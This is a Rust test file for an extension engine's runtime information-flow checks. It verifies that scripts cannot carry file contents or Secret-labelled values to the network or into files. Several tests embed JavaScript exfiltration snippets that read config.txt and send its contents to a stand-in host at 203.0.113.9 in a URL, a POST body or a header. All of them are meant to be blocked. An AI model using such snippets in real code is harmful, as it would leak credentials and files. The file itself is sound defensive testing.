//! bd-9vouw.8: host egress checks the labels it carries at run time.
//!
//! The static flow check decides most flows before execution. It gives the
//! `http.get` / `http.request` facade (`builtin:HttpGet`, `builtin:HttpRequest`)
//! the Internal clearance of its loopback server, so file contents reached the
//! network through it. The external request now checks its label where it
//! leaves the engine, and the `fs:*` / `net:*` HostCalls check their operands
//! against the clearance the static check gives their sink, so a flow the
//! static analysis misses stops before the provider sees it.

#![forbid(unsafe_code)]

use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};

use frankenengine_engine::ast::ParseGoal;
use frankenengine_engine::baseline_interpreter::{
    InterpreterConfig, InterpreterCore, InterpreterError, Value,
};
use frankenengine_engine::capability::RuntimeCapability;
use frankenengine_engine::execution_orchestrator::{
    ExecutionOrchestrator, ExtensionPackage, LabFixtureExecutionOrchestratorExt as _,
    OrchestratorConfig, OrchestratorError,
};
use frankenengine_engine::ifc_artifacts::Label;
use frankenengine_engine::ir_contract::{
    CapabilityTag, Ir0Module, Ir3Instruction, Ir3Module, RegRange,
};
use frankenengine_engine::lowering_pipeline::{
    LoweringContext, LoweringPipelineError, lower_ir0_to_ir3,
};
use frankenengine_engine::parser::{CanonicalEs2020Parser, ParserOptions, ParserSource};
use frankenengine_extension_host::host_io::{
    HostIoCapability, HostIoControl, HostIoError, HostIoOutcome, HostIoProvider, HostIoRecorder,
    HostIoRequest, HostIoResponse, InMemoryHostIoTranscript,
};

const FILE_CONTENTS: &str = "db-password=hunter2";

/// Answers file reads with FILE_CONTENTS and network requests with a 200, and
/// keeps every request it was asked to perform.
#[derive(Debug, Default)]
struct RecordingHostIo {
    requests: Mutex<Vec<HostIoRequest>>,
}

impl RecordingHostIo {
    fn answer(&self, request: &HostIoRequest, granted: &[HostIoCapability]) -> HostIoOutcome {
        assert!(
            granted.contains(&request.required_capability()),
            "{request:?} performed without its grant"
        );
        self.requests
            .lock()
            .expect("request log")
            .push(request.clone());
        match request {
            HostIoRequest::FsRead { .. } => Ok(HostIoResponse::FsRead {
                bytes: FILE_CONTENTS.as_bytes().to_vec(),
            }),
            HostIoRequest::FsWrite { data, .. } => Ok(HostIoResponse::FsWrite {
                bytes_written: data.len() as u64,
            }),
            HostIoRequest::NetworkRequest { .. } => Ok(HostIoResponse::NetworkRequest {
                response: b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_vec(),
            }),
            other => Err(HostIoError::Denied {
                reason: format!("unexpected request {other:?}"),
            }),
        }
    }

    fn count(&self, matches: fn(&HostIoRequest) -> bool) -> usize {
        self.requests
            .lock()
            .expect("request log")
            .iter()
            .filter(|request| matches(request))
            .count()
    }

    fn network_requests(&self) -> usize {
        self.count(|request| matches!(request, HostIoRequest::NetworkRequest { .. }))
    }

    fn file_writes(&self) -> usize {
        self.count(|request| matches!(request, HostIoRequest::FsWrite { .. }))
    }

    fn file_reads(&self) -> usize {
        self.count(|request| matches!(request, HostIoRequest::FsRead { .. }))
    }
}

impl HostIoProvider for RecordingHostIo {
    fn name(&self) -> &str {
        "bd-9vouw-8-recording-host-io"
    }

    fn perform(&self, request: &HostIoRequest, granted: &[HostIoCapability]) -> HostIoOutcome {
        self.answer(request, granted)
    }

    fn perform_controlled(
        &self,
        request: &HostIoRequest,
        granted: &[HostIoCapability],
        _control: Arc<dyn HostIoControl>,
    ) -> HostIoOutcome {
        self.answer(request, granted)
    }
}

fn run_package(
    source: &str,
) -> (
    Result<(), OrchestratorError>,
    Arc<RecordingHostIo>,
    Arc<InMemoryHostIoTranscript>,
) {
    let provider = Arc::new(RecordingHostIo::default());
    let transcript = Arc::new(InMemoryHostIoTranscript::recording());
    let recorder: Arc<dyn HostIoRecorder> = transcript.clone();
    let mut orchestrator = ExecutionOrchestrator::new(OrchestratorConfig::default());
    orchestrator.set_host_io(provider.clone(), Some(recorder));
    let package = ExtensionPackage {
        extension_id: "bd-9vouw-8-egress".to_string(),
        source: source.to_string(),
        source_file: None,
        module_root: None,
        capabilities: [
            "vm_dispatch",
            "heap_allocate",
            "builtin",
            "fs_read",
            "network_egress",
        ]
        .into_iter()
        .map(str::to_string)
        .collect(),
        version: "1.0.0".to_string(),
        metadata: BTreeMap::new(),
    };
    let outcome = orchestrator.execute(&package).map(|_| ());
    (outcome, provider, transcript)
}

#[test]
fn ordinary_scripts_cannot_claim_the_commonjs_require_binding() {
    let (outcome, provider, _) =
        run_package("const load = require; load('./private-dependency.cjs');");
    let error = outcome.expect_err("ordinary Script has no authenticated require binding");
    assert!(matches!(
        error.primary_error(),
        OrchestratorError::Lowering(lowering_error)
            if matches!(lowering_error.as_ref(),
                LoweringPipelineError::AmbientAuthorityViolation { accessor, .. }
                    if accessor == "require")
    ));
    assert_eq!(provider.count(|_| true), 0);
}

fn assert_deferred_http_confidentiality_denial(
    outcome: &Result<(), OrchestratorError>,
    transcript: &InMemoryHostIoTranscript,
) {
    let error = outcome.as_ref().expect_err("the flow must be refused");
    assert!(
        matches!(
            error.primary_error(),
            OrchestratorError::Interpreter(InterpreterError::UncaughtException { value })
                if value.contains("ERR_NETWORK")
        ),
        "expected unhandled deferred HTTP confidentiality ERR_NETWORK, got {:?}",
        error.primary_error()
    );
    let entries = transcript.recorded_entries();
    assert_eq!(
        entries.len(),
        2,
        "expected one file read and one recorded network confidentiality denial: {entries:?}"
    );
    assert!(
        matches!(
            &entries[1],
            (
                HostIoRequest::NetworkRequest { .. },
                Err(HostIoError::Denied { reason })
            ) if reason == "FLOW_POLICY_BLOCKED"
        ),
        "expected FLOW_POLICY_BLOCKED network denial entry, got {:?}",
        entries[1]
    );
}

/// File contents (Internal) sent in an `http.get` URL or an `http.request`
/// body are refused before the request reaches the provider. Public requests
/// through the same facade still go out.
#[test]
fn http_client_requests_cannot_carry_file_contents_to_the_network() {
    const READ: &str = "const fs = require('fs'); const http = require('http'); \
                        const data = fs.readFileSync('config.txt', 'utf8'); ";
    for exfiltration in [
        "http.get('http://203.0.113.9/collect?d=' + data);",
        "const req = http.request({ host: '203.0.113.9', path: '/collect', method: 'POST' }); \
         req.write(data); req.end();",
        "http.get({ host: '203.0.113.9', path: '/collect', headers: { 'x-d': data } });",
    ] {
        let (outcome, provider, transcript) = run_package(&format!("{READ}{exfiltration}"));
        assert_deferred_http_confidentiality_denial(&outcome, &transcript);
        assert_eq!(provider.file_reads(), 1, "{exfiltration}");
        assert_eq!(provider.network_requests(), 0, "{exfiltration}");
    }

    // The same flow through `https.get` (a net:request HostCall, Public
    // clearance) was already refused, statically: the runtime check brings
    // the http facade to the same policy.
    let (outcome, provider, _) = run_package(
        "const fs = require('fs'); const https = require('https'); \
         const data = fs.readFileSync('config.txt', 'utf8'); \
         https.get('https://203.0.113.9/collect?d=' + data);",
    );
    let error = outcome.expect_err("https exfiltration must be refused");
    assert!(
        matches!(
            error.primary_error(),
            OrchestratorError::Lowering(lowering_error)
                if matches!(
                    lowering_error.as_ref(),
                    LoweringPipelineError::UnauthorizedFlow {
                        source_label: Label::Internal,
                        sink_clearance: Label::Public,
                        ..
                    }
                )
        ),
        "{:?}",
        error.primary_error()
    );
    assert_eq!(provider.network_requests(), 0);

    for public in [
        "http.get('http://203.0.113.9/collect?d=' + data.length);",
        "const req = http.request({ host: '203.0.113.9', path: '/c', method: 'POST' }); \
         req.write('public'); req.end();",
    ] {
        let source = format!("const http = require('http'); const data = 'public-value'; {public}");
        let (outcome, provider, _) = run_package(&source);
        assert!(outcome.is_ok(), "{public}: {outcome:?}");
        assert_eq!(provider.network_requests(), 1, "{public}");
    }
}

fn lower(source: &str) -> Ir3Module {
    let tree = CanonicalEs2020Parser
        .parse_with_options(
            ParserSource {
                label: "ifc-runtime-sink-labels.js".into(),
                text: source.into(),
            },
            ParseGoal::Script,
            &ParserOptions::default(),
        )
        .expect("source must parse");
    lower_ir0_to_ir3(
        &Ir0Module::from_syntax_tree(tree, "ifc-runtime-sink-labels.js"),
        &LoweringContext::new("sink-trace", "sink-decision", "sink-policy"),
    )
    .expect("source must lower")
    .ir3
}

/// Run one host I/O HostCall over hand-labeled operands. The labels are set
/// directly on the registers, so this exercises the runtime check without any
/// help from the static analysis.
fn run_hostcall(
    capability: &str,
    operands: &[(&str, Label)],
) -> (Result<Value, InterpreterError>, Arc<RecordingHostIo>) {
    let provider = Arc::new(RecordingHostIo::default());
    let mut config = InterpreterConfig::quickjs_defaults();
    config.granted_capabilities = [
        RuntimeCapability::VmDispatch,
        RuntimeCapability::HeapAllocate,
        RuntimeCapability::FsWrite,
        RuntimeCapability::NetworkEgress,
    ]
    .into_iter()
    .collect();
    let mut core = InterpreterCore::new(config, "bd-9vouw-8-hostcall");
    core.set_host_io(provider.clone(), None);
    for (register, (text, label)) in (0u32..).zip(operands) {
        core.seed_register(register, Value::Str((*text).into()))
            .unwrap();
        core.set_register_label(register, label.clone()).unwrap();
    }
    let count = operands.len() as u32;
    let mut module = lower("0;");
    module.instructions = vec![
        Ir3Instruction::HostCall {
            capability: CapabilityTag(capability.into()),
            args: RegRange { start: 0, count },
            dst: count,
        },
        Ir3Instruction::Return { value: count },
    ];
    let outcome = core.execute(&module).map(|result| result.value);
    (outcome, provider)
}

#[test]
fn file_writes_check_their_operands_against_the_internal_clearance() {
    for label in [Label::Secret, Label::TopSecret] {
        let (outcome, provider) = run_hostcall(
            "fs:write",
            &[("out.txt", Label::Public), ("hunter2", label.clone())],
        );
        assert!(
            matches!(&outcome, Err(InterpreterError::CapabilityDenied { capability })
                if capability == "fs:write:confidentiality"),
            "{label:?} data: {outcome:?}"
        );
        assert_eq!(
            provider.file_writes(),
            0,
            "{label:?} data reached the provider"
        );

        let (outcome, provider) = run_hostcall(
            "fs:write",
            &[("out.txt", label.clone()), ("public", Label::Public)],
        );
        assert!(
            matches!(&outcome, Err(InterpreterError::CapabilityDenied { capability })
                if capability == "fs:write:confidentiality"),
            "{label:?} path: {outcome:?}"
        );
        assert_eq!(
            provider.file_writes(),
            0,
            "{label:?} path reached the provider"
        );
    }
    // Internal data (a file read, a response) may be written to a file.
    let (outcome, provider) = run_hostcall(
        "fs:write",
        &[("out.txt", Label::Public), ("contents", Label::Internal)],
    );
    assert!(outcome.is_ok(), "{outcome:?}");
    assert_eq!(provider.file_writes(), 1);
}

#[test]
fn network_requests_check_their_operands_against_the_public_clearance() {
    for label in [Label::Internal, Label::Secret] {
        let (outcome, provider) =
            run_hostcall("net:request", &[("http://203.0.113.9/?d=x", label.clone())]);
        assert!(
            matches!(&outcome, Err(InterpreterError::CapabilityDenied { capability })
                if capability == "net:request:confidentiality"),
            "{label:?}: {outcome:?}"
        );
        assert_eq!(
            provider.network_requests(),
            0,
            "{label:?} URL reached the provider"
        );
    }
    let (outcome, provider) = run_hostcall(
        "net:request",
        &[("http://203.0.113.9/public", Label::Public)],
    );
    assert!(outcome.is_ok(), "{outcome:?}");
    assert_eq!(provider.network_requests(), 1);
}

#[derive(Debug)]
struct LoopbackSocketHostIo {
    target_addr: std::net::SocketAddr,
    bytes_sent: Arc<Mutex<usize>>,
}

impl HostIoProvider for LoopbackSocketHostIo {
    fn name(&self) -> &str {
        "bd-9vouw-8-loopback-socket-host-io"
    }

    fn perform(&self, request: &HostIoRequest, granted: &[HostIoCapability]) -> HostIoOutcome {
        assert!(granted.contains(&request.required_capability()));
        match request {
            HostIoRequest::NetworkRequest { payload, .. } => {
                use std::io::Write as _;
                let mut stream = std::net::TcpStream::connect(self.target_addr)
                    .expect("connect to local listener");
                stream.write_all(payload).expect("write HTTP request");
                *self.bytes_sent.lock().expect("bytes_sent") += payload.len();
                Ok(HostIoResponse::NetworkRequest {
                    response: b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_vec(),
                })
            }
            other => Err(HostIoError::Denied {
                reason: format!("unexpected request {other:?}"),
            }),
        }
    }
}

/// bd-9vouw.8 Acceptance #1: a deferred function body whose static lowering saw
/// only Public values still cannot exfiltrate a runtime `Secret`-labeled value
/// through `http.get` to a real local TCP test server (0 connections, 0 bytes).
#[test]
fn deferred_function_body_secret_egress_denied_and_local_server_receives_zero_bytes() {
    use frankenengine_engine::baseline_interpreter::IfcRuntimeFlowDecision;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind loopback listener");
    listener
        .set_nonblocking(true)
        .expect("nonblocking loopback listener");
    let addr = listener.local_addr().expect("listener addr");

    // Lower a script where `deferredSend` is a deferred nested function body
    // that passed static IFC lowering because its captured `slot` initializer
    // was Public at compile time.
    let source = format!(
        "const http = require('http');\n\
         const slot = '__PLACEHOLDER_PUBLIC_VALUE__';\n\
         function deferredSend() {{\n\
             http.get('http://203.0.113.9:{}/leak?p=' + slot);\n\
         }}\n\
         deferredSend();\n",
        addr.port()
    );
    let tree = CanonicalEs2020Parser
        .parse_with_options(
            ParserSource {
                label: "deferred_egress_probe.js".into(),
                text: source.into(),
            },
            ParseGoal::Script,
            &ParserOptions::default(),
        )
        .expect("parse");
    let mut ir3 = lower_ir0_to_ir3(
        &Ir0Module::from_syntax_tree(tree, "deferred_egress_probe.js"),
        &LoweringContext::new("trace-wyazf", "decision-wyazf", "policy-wyazf"),
    )
    .expect("benign-looking deferred body lowers statically")
    .ir3;
    assert!(
        !ir3.function_table.is_empty(),
        "deferredSend must compile into ir3.function_table"
    );

    // Replace the placeholder literal load with a Move from pre-seeded Secret
    // register 250, simulating a runtime-tainted value bypassing static IR2.
    let secret_reg = 250u32;
    let mut patched = false;
    for instr in &mut ir3.instructions {
        if let Ir3Instruction::LoadStr { dst, pool_index } = *instr
            && ir3
                .constant_pool
                .get(pool_index as usize)
                .and_then(|s| s.as_str())
                == Some("__PLACEHOLDER_PUBLIC_VALUE__")
        {
            *instr = Ir3Instruction::Move {
                dst,
                src: secret_reg,
            };
            patched = true;
        }
    }
    assert!(
        patched,
        "must patch placeholder literal to seeded Secret register"
    );

    let bytes_sent = Arc::new(Mutex::new(0usize));
    let provider = Arc::new(LoopbackSocketHostIo {
        target_addr: addr,
        bytes_sent: bytes_sent.clone(),
    });
    let transcript = Arc::new(InMemoryHostIoTranscript::recording());
    let recorder: Arc<dyn HostIoRecorder> = transcript.clone();
    let mut config = InterpreterConfig::quickjs_defaults();
    config.granted_capabilities = [
        RuntimeCapability::VmDispatch,
        RuntimeCapability::HeapAllocate,
        RuntimeCapability::Builtin,
        RuntimeCapability::NetworkEgress,
    ]
    .into_iter()
    .collect();
    let mut core = InterpreterCore::new(config, "bd-9vouw-8-deferred-body");
    core.set_host_io(provider, Some(recorder));
    core.seed_register(secret_reg, Value::Str("sk-live-9999".into()))
        .expect("seed secret register");
    core.set_register_label(secret_reg, Label::Secret)
        .expect("label secret register");

    let err = core
        .execute(&ir3)
        .expect_err("Secret flowing into deferred http.get body must be denied at runtime");
    assert!(
        matches!(
            &err,
            InterpreterError::UncaughtException { value }
                if value.contains("ERR_NETWORK")
        ),
        "expected unhandled deferred HTTP confidentiality ERR_NETWORK, got {err:?}"
    );
    assert_eq!(
        *bytes_sent.lock().expect("bytes_sent"),
        0,
        "provider must not transmit any bytes on runtime IFC denial"
    );
    assert!(
        matches!(listener.accept(), Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock),
        "local TCP server must receive zero connections/bytes"
    );
    let entries = transcript.recorded_entries();
    assert_eq!(
        entries.len(),
        1,
        "expected exact one-shot FLOW_POLICY_BLOCKED denial in transcript: {entries:?}"
    );
    assert!(
        matches!(
            &entries[0],
            (
                HostIoRequest::NetworkRequest { .. },
                Err(HostIoError::Denied { reason })
            ) if reason == "FLOW_POLICY_BLOCKED"
        ),
        "expected FLOW_POLICY_BLOCKED network denial entry, got {:?}",
        entries[0]
    );
    let audit = core.ifc_runtime_flow_audit();
    assert!(
        audit.iter().any(|entry| {
            entry.capability == "net:request"
                && matches!(entry.source_label, Label::Secret)
                && entry.sink_clearance == Label::Public
                && entry.decision == IfcRuntimeFlowDecision::Denied
        }),
        "runtime sink denial must emit structured audit evidence: {audit:?}"
    );
}

/// bd-9vouw.8 Acceptance #3: declassified runtime egress succeeds ONLY with a
/// valid signed `DeclassificationReceipt` inside its validity window; missing,
/// forged, and expired receipts are denied before reaching the provider.
#[test]
fn declassified_egress_requires_valid_unexpired_signed_receipt() {
    use frankenengine_engine::baseline_interpreter::IfcRuntimeFlowDecision;
    use frankenengine_engine::ifc_artifacts::{
        ContentBinding, DeclassificationDecision, DeclassificationReceipt, DeclassificationRoute,
        FlowPolicy, FlowPolicyEnforcement, IfcSchemaVersion,
    };
    use frankenengine_engine::signature_preimage::{SIGNATURE_SENTINEL, Signature, SigningKey};

    let signing_key = SigningKey::from_bytes([19u8; 32]).expect("signing key");
    let policy = FlowPolicy {
        policy_id: "policy-bd-9vouw-8".to_string(),
        extension_id: "ext-bd-9vouw-8".to_string(),
        label_classes: [Label::Public, Label::Internal, Label::Secret]
            .into_iter()
            .collect(),
        clearance_classes: [Label::Public, Label::Internal].into_iter().collect(),
        allowed_flows: vec![],
        prohibited_flows: vec![],
        declassification_routes: vec![DeclassificationRoute {
            route_id: "route-secret-net-egress".to_string(),
            source_label: Label::Secret,
            target_clearance: Label::Public,
            conditions: vec!["signed_receipt_verified".to_string()],
        }],
        enforcement_mode: FlowPolicyEnforcement::LatticeOpen,
        epoch_id: 1,
        schema_version: IfcSchemaVersion::CURRENT,
        signature: Signature::from_bytes(SIGNATURE_SENTINEL),
    };

    let payload = "https://203.0.113.9/webhook?digest=approved";
    let binding =
        ContentBinding::new(payload.as_bytes(), Label::Secret, &signing_key).expect("binding");
    let mut valid_receipt = DeclassificationReceipt {
        receipt_id: "rcpt-net-egress-1".to_string(),
        source_label: Label::Secret,
        sink_clearance: Label::Public,
        content_binding: Some(binding),
        declassification_route_ref: "route-secret-net-egress".to_string(),
        decision_contract_id: "contract-bd-9vouw-8".to_string(),
        policy_evaluation_summary: "approved webhook egress".to_string(),
        loss_assessment_milli: 50,
        decision: DeclassificationDecision::Allow,
        authorized_by: signing_key.verification_key(),
        replay_linkage: "trace-bd-9vouw-8".to_string(),
        timestamp_ms: 1_700_000_000_000,
        not_before_ms: 1_699_000_000_000,
        not_after_ms: 1_701_000_000_000,
        schema_version: IfcSchemaVersion::CURRENT,
        signature: Signature::from_bytes(SIGNATURE_SENTINEL),
    };
    valid_receipt.sign(&signing_key).expect("sign receipt");

    let run_with = |receipts: Vec<DeclassificationReceipt>,
                    epoch_ms: Option<u64>|
     -> (
        Result<Value, InterpreterError>,
        Arc<RecordingHostIo>,
        Vec<frankenengine_engine::baseline_interpreter::IfcRuntimeFlowAuditEntry>,
    ) {
        let provider = Arc::new(RecordingHostIo::default());
        let mut config = InterpreterConfig::quickjs_defaults();
        config.granted_capabilities = [
            RuntimeCapability::VmDispatch,
            RuntimeCapability::HeapAllocate,
            RuntimeCapability::NetworkEgress,
        ]
        .into_iter()
        .collect();
        config.ifc_flow_policy = Some(policy.clone());
        config.declassification_receipts = receipts;
        let mut core = InterpreterCore::new(config, "bd-9vouw-8-receipt");
        core.set_host_io(provider.clone(), None);
        core.set_ifc_validation_epoch_ms(epoch_ms);
        core.seed_register(0, Value::Str(payload.into())).unwrap();
        core.set_register_label(0, Label::Secret).unwrap();
        let mut module = lower("0;");
        module.instructions = vec![
            Ir3Instruction::HostCall {
                capability: CapabilityTag("net:request".into()),
                args: RegRange { start: 0, count: 1 },
                dst: 1,
            },
            Ir3Instruction::Return { value: 1 },
        ];
        let outcome = core.execute(&module).map(|res| res.value);
        let audit = core.take_ifc_runtime_flow_audit();
        (outcome, provider, audit)
    };

    // 1. Missing receipt -> denied.
    let (missing, missing_io, missing_audit) = run_with(vec![], Some(1_700_000_500_000));
    assert!(matches!(
        missing,
        Err(InterpreterError::CapabilityDenied { ref capability })
            if capability == "net:request:confidentiality"
    ));
    assert_eq!(missing_io.network_requests(), 0);
    assert_eq!(missing_audit[0].decision, IfcRuntimeFlowDecision::Denied);

    // 2. Forged signature -> denied.
    let mut forged = valid_receipt.clone();
    forged.signature = Signature::from_bytes([0x5A; 64]);
    let (forged_res, forged_io, forged_audit) = run_with(vec![forged], Some(1_700_000_500_000));
    assert!(forged_res.is_err());
    assert_eq!(forged_io.network_requests(), 0);
    assert_eq!(forged_audit[0].decision, IfcRuntimeFlowDecision::Denied);

    // 3. Expired receipt (validation_epoch_ms > not_after_ms) -> denied.
    let (expired_res, expired_io, expired_audit) =
        run_with(vec![valid_receipt.clone()], Some(1_702_000_000_000));
    assert!(
        matches!(
            expired_res,
            Err(InterpreterError::CapabilityDenied { ref capability })
                if capability == "net:request:confidentiality"
        ),
        "expired receipt must fail closed, got {expired_res:?}"
    );
    assert_eq!(expired_io.network_requests(), 0);
    assert_eq!(expired_audit[0].decision, IfcRuntimeFlowDecision::Denied);

    // 4. Valid signed, unexpired receipt -> allowed and audited as Declassified.
    let (ok_res, ok_io, ok_audit) = run_with(vec![valid_receipt], Some(1_700_000_500_000));
    assert!(
        ok_res.is_ok(),
        "valid receipt must allow egress: {ok_res:?}"
    );
    assert_eq!(ok_io.network_requests(), 1);
    assert_eq!(ok_audit[0].decision, IfcRuntimeFlowDecision::Declassified);
    assert_eq!(ok_audit[0].receipt_id.as_deref(), Some("rcpt-net-egress-1"));
}

/// bd-9vouw.8 Acceptance #4: measure per-sink runtime label check overhead
/// (`ns/call`) when static proof already discharged the flow (`Label::Public`).
#[test]
fn runtime_sink_label_check_overhead_measured_ns_per_call() {
    #[derive(Debug, Default)]
    struct ZeroCostNoopHostIo;

    impl HostIoProvider for ZeroCostNoopHostIo {
        fn name(&self) -> &str {
            "bd-9vouw-8-noop-bench-io"
        }

        fn perform(&self, request: &HostIoRequest, _granted: &[HostIoCapability]) -> HostIoOutcome {
            match request {
                HostIoRequest::FsWrite { data, .. } => Ok(HostIoResponse::FsWrite {
                    bytes_written: data.len() as u64,
                }),
                HostIoRequest::NetworkRequest { .. } => Ok(HostIoResponse::NetworkRequest {
                    response: b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".to_vec(),
                }),
                other => Err(HostIoError::Denied {
                    reason: format!("unexpected {other:?}"),
                }),
            }
        }
    }

    const ITERS: usize = 2_000;
    let provider: Arc<dyn HostIoProvider> = Arc::new(ZeroCostNoopHostIo);
    let mut base_cfg = InterpreterConfig::quickjs_defaults();
    base_cfg.instruction_budget = 1_000_000;
    base_cfg.granted_capabilities = [
        RuntimeCapability::VmDispatch,
        RuntimeCapability::HeapAllocate,
        RuntimeCapability::FsWrite,
        RuntimeCapability::NetworkEgress,
    ]
    .into_iter()
    .collect();

    let mut fs_module = lower("0;");
    fs_module.instructions = vec![
        Ir3Instruction::HostCall {
            capability: CapabilityTag("fs:write".into()),
            args: RegRange { start: 0, count: 2 },
            dst: 2,
        },
        Ir3Instruction::Return { value: 2 },
    ];
    let mut net_module = lower("0;");
    net_module.instructions = vec![
        Ir3Instruction::HostCall {
            capability: CapabilityTag("net:request".into()),
            args: RegRange { start: 0, count: 1 },
            dst: 2,
        },
        Ir3Instruction::Return { value: 2 },
    ];

    let mut core = InterpreterCore::new(base_cfg, "bd-9vouw-8-bench");
    core.set_host_io(provider, None);
    core.seed_register(0, Value::Str("out.txt".into())).unwrap();
    core.seed_register(1, Value::Str("ok".into())).unwrap();
    core.set_register_label(0, Label::Public).unwrap();
    core.set_register_label(1, Label::Public).unwrap();

    // Warmup
    for _ in 0..50 {
        core.execute(&fs_module).expect("fs warmup");
    }
    let t0 = std::time::Instant::now();
    for _ in 0..ITERS {
        core.execute(&fs_module).expect("fs sink");
    }
    let fs_ns_per_call = t0.elapsed().as_nanos() as f64 / ITERS as f64;

    core.seed_register(0, Value::Str("http://203.0.113.9/ok".into()))
        .unwrap();
    core.set_register_label(0, Label::Public).unwrap();
    for _ in 0..50 {
        core.execute(&net_module).expect("net warmup");
    }
    let t1 = std::time::Instant::now();
    for _ in 0..ITERS {
        core.execute(&net_module).expect("net sink");
    }
    let net_ns_per_call = t1.elapsed().as_nanos() as f64 / ITERS as f64;

    // Also measure pure denied fast-fail on Secret operand (isolates sink check before I/O).
    core.set_register_label(0, Label::Secret).unwrap();
    let t2 = std::time::Instant::now();
    for _ in 0..ITERS {
        let _ = core.execute(&net_module);
    }
    let net_deny_ns_per_call = t2.elapsed().as_nanos() as f64 / ITERS as f64;

    eprintln!(
        "[bd-9vouw.8] runtime_sink_overhead: fs_write_public={fs_ns_per_call:.1} ns/call, \
         net_request_public={net_ns_per_call:.1} ns/call, \
         net_request_secret_deny={net_deny_ns_per_call:.1} ns/call (iters={ITERS})"
    );
    assert!(fs_ns_per_call.is_finite() && net_ns_per_call.is_finite());
}
